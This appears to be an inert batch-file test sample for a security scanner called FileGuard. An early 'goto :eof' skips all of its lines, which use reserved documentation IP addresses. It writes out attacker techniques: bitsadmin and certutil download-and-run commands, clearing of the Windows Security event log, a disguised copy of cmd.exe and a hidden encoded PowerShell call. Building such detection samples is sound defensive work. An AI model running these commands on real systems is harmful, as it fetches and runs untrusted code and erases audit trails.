@echo off
rem FileGuard inert test sample - non-functional, reserved addresses only
goto :eof
bitsadmin /transfer job /download /priority high http://203.0.113.122/p.exe %TEMP%\p.exe & %TEMP%\p.exe
wevtutil cl Security
copy C:\Windows\System32\cmd.exe %PROGRAMDATA%\nimbushost.exe
powershell -w hidden -ep bypass -enc ZQBjAGgAbwAgAEYAaQBsAGUARwB1AGEAcgBkACAAaQBuAGUAcgB0ACAAdABlAHMAdAAgAHMAYQBtAHAAbABlACAALQAgAG4AbwBuAC0AZgB1AG4AYwB0AGkAbwBuAGEAbAAsACAAcgBlAHMAZQByAHYAZQBkACAAYQBkAGQAcgBlAHMAcwBlAHMAIABvAG4AbAB5AA==
certutil -urlcache -split -f http://192.0.2.108/svc.exe %TEMP%\svc.exe && start %TEMP%\svc.exe
